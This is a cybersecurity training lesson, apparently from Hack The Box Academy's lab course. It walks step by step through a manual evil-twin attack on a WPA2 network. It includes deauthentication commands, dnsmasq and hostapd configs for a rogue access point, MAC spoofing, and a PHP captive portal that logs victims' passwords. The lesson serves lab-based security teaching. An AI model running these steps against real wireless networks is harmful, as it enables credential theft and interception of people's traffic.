
<h1>Evil Twin Attack on WPA2</h1>
<hr/>
<p>The evil twin attack on WPA2 involves creating a rogue access point (AP) that mimics a legitimate one, tricking unsuspecting clients into connecting to it. The primary difference here is that the identical rogue access point is an <code>open</code> network. Once connected, the attacker can intercept sensitive data or perform further exploitation, such as phishing for credentials using captive portals or executing man-in-the-middle (MITM) attacks.</p>
<p><img alt="intro" src="https://academy.hackthebox.com/storage/modules/291/intro/002.png"/></p>
<p>Unlike automated tools, a manual evil-twin attack gives attackers fine-grained control over every stage of the process, from crafting the fake AP to managing connected clients. This approach provides a deeper understanding of the mechanisms and allows customization to bypass security measures configured by clients.</p>
<p>In this section, weâ€™ll explore how to set up a manual evil-twin attack on a WPA2 network, focusing on following steps:</p>
<ol>
<li>
<code>Monitor the target &amp; capture valid WPA handshake</code> : The first step is to perform reconnaissance on the target network to gather critical details such as the network name (SSID), BSSID, authentication type, and other relevant information. Once this data is collected, we use airodump-ng to capture a valid handshake. This handshake will later be used to validate the network credentials during the attack process.</li>
<li>
<code>Configure the routing</code> : The next step is to configure routing correctly, along with setting up the DNS and DHCP servers for the fake access point. These services will assign IP addresses to connected clients and handle their network requests, ensuring seamless connectivity that mimics the legitimate access point. Additionally, configure the wireless interface hosting the fake access point with an appropriate IP address and modify its MAC address to closely resemble that of the target access point for added authenticity.</li>
<li>
<code>Setup the captive portal</code> : The next step is to set up a captive portal that will display a login page to the victim (client). This portal is designed to capture any credentials entered by the victim, allowing us to collect the necessary authentication details for further exploitation.</li>
<li>
<code>Spin up the fake access point</code> : Next, we launch the fake open access point using <code>hostapd</code>, ensuring it has a network name (ESSID) identical to the target and a BSSID that closely resembles the target's. This enhances the illusion of legitimacy, increasing the chances of the victim connecting to this rogue access point.</li>
<li>
<code>Capture &amp; Validate the credentials</code> : Finally, once the victim connects to the fake access point and enters their login credentials through the captive portal, we capture these credentials. We then validate them against the real target network to ensure their authenticity. This step confirms that the obtained credentials are correct and can be used for further exploitation or access to the target network.</li>
</ol>
<p>To ensure a successful setup, we need at least two wireless interfaces that support monitor mode and packet injection. These can be either two 2.4 GHz interfaces, two 5 GHz interfaces, or one of each, depending on the target network. The reason for this is that hosting the fake access point is resource-intensive for the wireless card, and we still need to perform monitoring and deauthentication/disassociation attacks. Therefore, we dedicate one card to host the fake AP (e.g., <code>wlan1</code>) and the other to monitor the network and handle deauthentication/disassociation (e.g., <code>wlan0</code>). This setup ensures that both tasks can be performed simultaneously without overloading a single interface.</p>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> Note: All the commands shown in this module should be run as root. Use 'sudo -s' to switch to the root user.
</div>
<hr/>
<h2>Performing the Attack:</h2>
<hr/>
<h3>1. Monitor the target &amp; capture valid WPA handshake</h3>
<p>First, we need to set our interface to monitor mode using <code>airmon-ng</code>.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
</code></pre>
<p>Next, we will use <code>airodump-ng</code> to scan for available Wi-Fi networks. To save the scan results for later analysis, we use the <code>--write</code> (or <code>-w</code>) parameter followed by a filename. This writes the output to a file with the specified prefix, enabling us to efficiently store and review the captured data.</p>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng wlan0mon -w HTB -c 1

11:32:13  Created capture file "HTB-01.cap".

 CH 1 ][ Elapsed: 6 s ][ 2024-11-27 11:55 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 D4:C1:8B:79:AD:45  -28        7        2    0   1   54   WPA2 TKIP   PSK  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 D4:C1:8B:79:AD:45  C2:CA:2A:79:D5:87  -29   54 -48      0        2 
</code></pre>
<p>Now, we need to deauthenticate the connected client using aireplay-ng. This forces the client to disconnect from the legitimate access point, prompting it to reconnect. During this reconnection process, we can capture a valid WPA handshake, which is essential for validating the network credentials later.</p>
<pre><code class="language-shell-session">[!bash!]$ aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon

11:51:19  Waiting for beacon frame (BSSID: D4:C1:8B:79:AD:45) on channel 1
NB: this attack is more effective when targeting
a connected wireless client (-c &lt;client's mac&gt;).
11:51:19  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:20  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:20  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:21  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:21  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
</code></pre>
<p>Once the clients are deauthenticated from the AP, we can continue observing <code>airodump-ng</code> to see when they reconnect.</p>
<pre><code class="language-shell-session">[!bash!]$ airodump-ng wlan0mon -w HTB

CH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: D4:C1:8B:79:AD:45

 CH 10 ][ Elapsed: 6 s ][ 2024-11-27 11:55 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 D4:C1:8B:79:AD:45  -28        7        2    0   1   54   WPA2 TKIP   PSK  HTB-Corp                                           

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 D4:C1:8B:79:AD:45  C2:CA:2A:79:D5:87  -29   54 -48      0        2 
</code></pre>
<p>In the output above, we can see that after sending the deauthentication packet, the client disconnects and then reconnects. This is evidenced by the increase in Lost packets and Frames count. Additionally, a four-way handshake would be captured by airodump-ng, as shown in the output.</p>
<hr/>
<h3>2. Configure the routing</h3>
<p>The next step is to configure routing by setting up the DNS and DHCP servers for the fake access point. These services will assign IP addresses to connected clients and handle their network requests, ensuring seamless connectivity that mimics the legitimate access point.</p>
<p>To configure the routing correctly, we need to follow these steps:</p>
<ul>
<li>
<code>Set up DNS and DHCP for the fake network</code> : Configure DNS and DHCP services for the rogue access point, ensuring clients receive valid IP addresses and can resolve domain names.</li>
<li>
<code>Assign a valid IP address to the wireless interface</code> : Configure the wireless interface hosting the fake access point (e.g., wlan1) with a proper IP address to ensure proper routing.</li>
<li>
<code>Modify the MAC address of the wireless interface</code> : Change the MAC address of the wlan1 interface to closely resemble that of the target access point. This helps make the fake AP appear more legitimate to connected clients.</li>
</ul>
<p>We can use <code>dnsmasq</code> to configure DNS and DHCP for the <code>wlan1</code> interface. To get started, we need to create a <code>dns.conf</code> file with the following contents:</p>
<pre><code class="language-dns.conf">interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
</code></pre>
<p>In the above config file, we specify many parameters. These parameters can be broken down like the following:</p>
<table>
<thead>
<tr>
<th>Item</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Interface</code></td>
<td>The interface which we will be hosting the access point on.</td>
</tr>
<tr>
<td><code>dhcp-range</code></td>
<td>This specifies that the DHCP server will provide IP addresses to connected clients starting from 192.168.0.2 up to 192.168.0.254, and each client will receive a lease for 10 hours. Once the lease time expires, the client will need to request a new IP address.</td>
</tr>
<tr>
<td><code>DHCP option 3</code></td>
<td>This option specifies the default gateway for the DHCP clients. In this case, dhcp-option=3,192.168.0.1 tells the clients to use 192.168.0.1 as their gateway, which will be the IP address of the fake access point (wlan1).</td>
</tr>
<tr>
<td><code>DHCP option 6</code></td>
<td>This option specifies the DNS server that the DHCP clients should use. By setting dhcp-option=6,192.168.0.1, the clients are directed to use the IP address of the fake AP (192.168.0.1) as their DNS server, instead of any DNS servers provided by the legitimate gateway or the target network. This ensures that DNS queries are handled by the attacker's fake AP, which can be used to intercept, manipulate, or redirect DNS requests.</td>
</tr>
<tr>
<td><code>server</code></td>
<td>This line tells dnsmasq to forward any DNS queries from the connected clients to the public DNS server at 8.8.4.4 &amp; 8.8.8.8.</td>
</tr>
<tr>
<td><code>listen-address</code></td>
<td>The listen-address option in the dnsmasq configuration file specifies the IP address on which dnsmasq will listen for incoming DNS requests.</td>
</tr>
<tr>
<td><code>address</code></td>
<td>This line would make dnsmasq return the IP address 192.168.0.1 when clients try to resolve any domain. The # symbol is a wildcard that matches any domain.</td>
</tr>
<tr>
<td><code>log-dhcp</code></td>
<td>The log-dhcp option in dnsmasq enables logging of DHCP (Dynamic Host Configuration Protocol) activity. When this option is activated, dnsmasq will log each DHCP event, such as IP address assignments, leases, and client interactions with the DHCP server.</td>
</tr>
<tr>
<td><code>log-queries</code></td>
<td>The log-queries option in dnsmasq enables logging of all DNS queries made by clients. When this option is activated, dnsmasq will log each DNS request it receives, along with details such as the queried domain, the source IP address of the client, and the response sent back.</td>
</tr>
</tbody>
</table>
<p>We can start dnsmasq with the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 127.0.0.53#53
dnsmasq: read /etc/hosts - 7 names
</code></pre>
<p>If it fails to start, it likely means that another service is already using port 53. In this case, we'll need to identify and stop the process occupying the port. We can do this by running:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo lsof -i :53

COMMAND   PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd-r 231 systemd-resolve   13u  IPv4  36129      0t0  UDP localhost:domain 
systemd-r 231 systemd-resolve   14u  IPv4  36130      0t0  TCP localhost:domain (LISTEN)
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ sudo systemctl stop systemd-resolved
</code></pre>
<p>The next step is to configure the valid IP address for the interface that will host the fake access point (<code>wlan1</code>).</p>
<pre><code class="language-shell-session">[!bash!]$ sudo ifconfig wlan1 192.168.0.1/24
[!bash!]$ ifconfig wlan1
wlan1: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        inet 192.168.0.1  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>
<p>Additionally, we need to ensure that IP forwarding is enabled on the machine to allow proper routing of traffic between the fake access point and the internet. We can do this by running:</p>
<pre><code class="language-shell-session">[!bash!]$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward
</code></pre>
<p>Next, we will change the MAC address of the <code>wlan1</code> interface to closely resemble that of the legitimate access point. This can be done using the <code>macchanger</code> tool.</p>
<p>We won't make the MAC address identical, but instead, we'll make it very similar. For example, if the real MAC address is <code>D4:C1:8B:79:AD:45</code>, we can change it to <code>D4:C1:8B:79:AD:44</code> (noticing the change from 45 to 44). This subtle modification helps the fake AP appear more legitimate while maintaining its distinct identity.</p>
<pre><code class="language-shell-session">[!bash!]$ ifconfig wlan1 down
[!bash!]$ macchanger -m D4:C1:8B:79:AD:44 wlan1
Current MAC:   02:00:00:00:03:00 (unknown)
Permanent MAC: 02:00:00:00:03:00 (unknown)
New MAC:       D4:C1:8B:79:AD:44 (unknown)
[!bash!]$ ifconfig wlan1 up
[!bash!]$ ifconfig wlan1
wlan1: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        inet 192.168.0.1  netmask 255.255.255.0  broadcast 192.168.0.255
        ether d4:c1:8b:79:ad:44  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>
<p>Lastly, we start <code>dnsspoof</code> on the <code>wlan1</code> interface to redirect all traffic from the victim's device to our attacker's IP address. This step allows us to intercept and monitor the client's communications.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo dnsspoof -i wlan1

dnsspoof: listening on wlan1 [udp dst port 53 and not src 192.168.0.1]
</code></pre>
<hr/>
<h3>3. Setup the captive portal</h3>
<p>For our manual Evil-Twin attack setup, we will use an Apache server with PHP to capture credentials. This setup provides flexibility, allowing us to easily switch between different templates for our attack. Additionally, by utilizing the Apache rewrite engine and redirecting all traffic to our web server, we can ensure that users are prompted to log in to our network. The goal is to lure users into clicking the sign-in prompt, which will direct them to our captive portal, where their credentials can be captured.</p>
<p><img alt="wpa2" src="https://academy.hackthebox.com/storage/modules/291/wpa2/captive.png"/></p>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> The captive portal is pre-configured within the lab environment, allowing us to focus directly on executing the attack and analyzing the results without manually setting up and configuring the entire infrastructure. The following setup steps are provided solely for demonstration purposes.
</div>
<br/>
<p>We install the necessary tools required to host a captive portal using following command:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo apt-get install apache2 php libapache2-mod-php
</code></pre>
<p>Then we want to activate the rewrite engine for Apache</p>
<pre><code class="language-shell-session">[!bash!]$ sudo a2enmod rewrite
</code></pre>
<p>Then we need to change part of our apache configuration file located at <code>/etc/apache2/apache2.conf</code> to allow overrides. We replace <code>AllowOverride none</code> with <code>AllowOverride all</code> for our relevant directories. For Apache2 we will be using the default <code>/var/www/html</code> directory for our captive portal.</p>
<p>We change a portion of the configuration file to have the following.</p>
<h4>Original Config</h4>
<pre><code class="language-Apache2.conf">...
&lt;Directory /&gt;
	Options FollowSymLinks
	AllowOverride None
	Require all denied
&lt;/Directory&gt;
&lt;Directory /var/www/&gt;
	Options Indexes FollowSymLinks
	AllowOverride None 
	Require all granted
&lt;/Directory&gt;
</code></pre>
<h4>With Modifications</h4>
<pre><code class="language-Apache2.conf">...
&lt;Directory /&gt;
	Options FollowSymLinks
	AllowOverride All
	Require all denied
&lt;/Directory&gt;
&lt;Directory /var/www/&gt;
	Options Indexes FollowSymLinks
	AllowOverride All
	Require all granted
&lt;/Directory&gt;
...
</code></pre>
<p>At this point we need to setup an <code>.htacces</code> file. This defines rules for our web server, that notifies stations connected to our fake AP that they need to sign in through the captive portal. We do so in the <code>/var/www/html</code> directory.</p>
<pre><code class="language-.htaccess">RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule . index.html [L]
</code></pre>
<p>Then we save the .htaccess file and restart apache2.</p>
<pre><code class="language-shell-session">[!bash!]$ service apache2 restart
</code></pre>
<p>If a user enters their password a POST request is sent to <code>received.php</code> which consists of the following</p>
<pre><code class="language-php">&lt;?php
if(isset($_POST['submit'])) {
    $password = $_POST['password'];

    $data = $password . "\r\n";
    $ret = file_put_contents('passes.lst', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('An error has occurred');
    }
    else {
        echo "Thank you for signing in. You will be redirected shortly!";
    }
}
else {
   die('No post data to process');
}
?&gt;

</code></pre>
<p>The <code>received.php</code> file simply takes the user input and writes it to <code>passes.lst</code>, our dictionary. We will be using this dictionary later in order to validate the captured pre-shared keys against the handshake with CowPatty. When testing this form, if an error message is displayed by received.php, it is commonly a permissions issue, which can be resolved with the following command.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo chown -R www-data:www-data /var/www/html/passes.lst
</code></pre>
<hr/>
<h3>4. Spin up the fake access point</h3>
<p>To set up our rogue access point, we use the following configuration file and save it as <code>hostapd.conf</code>:</p>
<pre><code class="language-configuration">interface=wlan1
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211
</code></pre>
<p>Once the configuration file is ready, we launch the rogue access point using <code>hostapd</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ hostapd hostapd.conf 

rfkill: Cannot open RFKILL control device
wlan0: interface state UNINITIALIZED-&gt;ENABLED
wlan0: AP-ENABLED 
</code></pre>
<p>Initially, we can wait for clients to connect to our rogue access point (AP) naturally. However, if no connections occur after a reasonable amount of time, we can forcefully encourage clients to connect by performing a deauthentication attack against the legitimate AP. This attack disconnects clients from the legitimate network, making them more likely to connect to our rogue AP.</p>
<p>To execute a deauthentication attack, we can use aireplay-ng:</p>
<pre><code class="language-shell-session">[!bash!]$ aireplay-ng --deauth 5 -a D4:C1:8B:79:AD:45 wlan0mon

11:51:19  Waiting for beacon frame (BSSID: D4:C1:8B:79:AD:45) on channel 1
NB: this attack is more effective when targeting
a connected wireless client (-c &lt;client's mac&gt;).
11:51:19  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:20  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:20  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:21  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
11:51:21  Sending DeAuth (code 7) to broadcast -- BSSID: [D4:C1:8B:79:AD:45]
</code></pre>
<p>Once a client connects to our rogue AP, the <code>hostapd</code> output would be similar to the following:</p>
<pre><code class="language-shell-session">[!bash!]$ hostapd apd.conf 

rfkill: Cannot open RFKILL control device
wlan0: interface state UNINITIALIZED-&gt;ENABLED
wlan0: AP-ENABLED 
wlan0: STA C2:CA:2A:79:D5:87 IEEE 802.11: authenticated
wlan0: STA C2:CA:2A:79:D5:87 IEEE 802.11: associated (aid 1)
wlan0: AP-STA-CONNECTED C2:CA:2A:79:D5:87
wlan0: STA C2:CA:2A:79:D5:87 RADIUS: starting accounting session D82057CD7522F435
</code></pre>
<p>Additionally, we would observe a DHCP request from the client for an IP address in the <code>dnsmasq</code> tab, confirming that the client is attempting to communicate through the rogue access point.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo dnsmasq -C dns.conf -d

dnsmasq-dhcp: 2979841318 available DHCP range: 192.168.0.2 -- 192.168.0.254
dnsmasq-dhcp: 2979841318 client provides name: client
dnsmasq-dhcp: 2979841318 DHCPREQUEST(wlan0) 192.168.0.232 C2:CA:2A:79:D5:87
dnsmasq-dhcp: 2979841318 tags: wlan0
dnsmasq-dhcp: 2979841318 DHCPACK(wlan0) 192.168.0.232 C2:CA:2A:79:D5:87 client
</code></pre>
<hr/>
<h3>5. Capture &amp; Validate the credentials</h3>
<p>After a client successfully connects, they will be redirected to our fake captive portal, which would look like following:</p>
<p><img alt="manual" src="https://academy.hackthebox.com/storage/modules/291/captive_.PNG"/></p>
<p>If the client enters their password, the credentials will be captured and saved in the <code>passes.lst</code> file.</p>
<pre><code class="language-shell-session">[!bash!]$ cat /var/www/html/passes.lst 
&lt;SNIP&gt;
</code></pre>
<p>After the victim enters the correct password in the captive portal, we can enable internet access for them by configuring the iptables firewall rules. This step is crucial to avoid raising suspicion and maintain the connection.</p>
<pre><code class="language-shell-session">[!bash!]$ iptables --append POSTROUTING --table nat --out-interface eth0 -j MASQUERADE
[!bash!]$ iptables --append FORWARD --in-interface wlan0 -j ACCEPT
</code></pre>
<ul>
<li>The first rule enables NAT masquerading, allowing traffic from the rogue AP to route through the attacker's internet-connected interface (eth0).</li>
<li>The second rule accepts traffic from the rogue AP interface (wlan0), allowing clients to communicate with external networks.</li>
</ul>
<hr/>
<h2>Key Considerations:</h2>
<p>The success of this evil twin attack depends on the following key factors:</p>
<ul>
<li>
<code>Signal Dominance</code>: Ensure the rogue AP consistently provides a stronger signal to maintain the client's connection.</li>
<li>
<code>Captive Portal Realism</code>: The success of the attack depends on the captive portal's design. It must convincingly imitate the legitimate login page.</li>
<li>
<code>Credential Validation</code>: Ensure that only valid credentials are used, avoiding detection from repeated incorrect login attempts.</li>
</ul>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="34" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="48" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i> Â Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i> Â Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i> Â Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
